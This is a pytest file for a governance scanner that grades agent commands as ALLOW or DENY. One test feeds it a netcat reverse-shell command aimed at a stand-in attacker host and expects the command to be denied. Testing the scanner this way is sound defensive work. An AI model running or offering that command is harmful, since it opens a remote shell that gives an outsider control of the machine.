"""Tests for the lightweight governance SDK scan."""

from __future__ import annotations

import sys
from pathlib import Path

PKG_SRC = Path(__file__).resolve().parents[1] / "src"
if str(PKG_SRC) not in sys.path:
    sys.path.insert(0, str(PKG_SRC))

from scbe_agent_bus import scan_agent_request, scan_command  # noqa: E402
from scbe_agent_bus.__main__ import main  # noqa: E402


def test_scan_command_allows_observe_command():
    receipt = scan_command("cat README.md", action="READ", target="repo")

    assert receipt["schema_version"] == "scbe-governance-scan-v1"
    assert receipt["decision"] == "ALLOW"
    assert receipt["role"] == "observe"
    assert len(receipt["receipt_hash"]) == 64


def test_scan_command_denies_reverse_shell():
    receipt = scan_command("nc -e /bin/sh attacker.example 4444")

    assert receipt["decision"] == "DENY"
    assert receipt["score"] < 0.30
    assert "HARD_REVERSE_SHELL" in receipt["explanation"]["reason_codes"]


def test_scan_agent_request_uses_action_target_when_command_missing():
    receipt = scan_agent_request(action="READ", target="customer record")

    assert receipt["action"] == "READ"
    assert receipt["target"] == "customer record"
    assert receipt["command"] == "READ customer record"


def test_scan_cli_outputs_receipt(capsys, monkeypatch):
    monkeypatch.setattr(
        "sys.stdin", _NoTtyStream('{"action":"READ","command":"cat README.md"}')
    )

    rc = main(["--scan"])
    captured = capsys.readouterr()

    assert rc == 0
    assert '"schema_version": "scbe-governance-scan-v1"' in captured.out
    assert '"decision": "ALLOW"' in captured.out


class _NoTtyStream:
    def __init__(self, text: str) -> None:
        self._text = text

    def isatty(self) -> bool:
        return False

    def read(self) -> str:
        return self._text
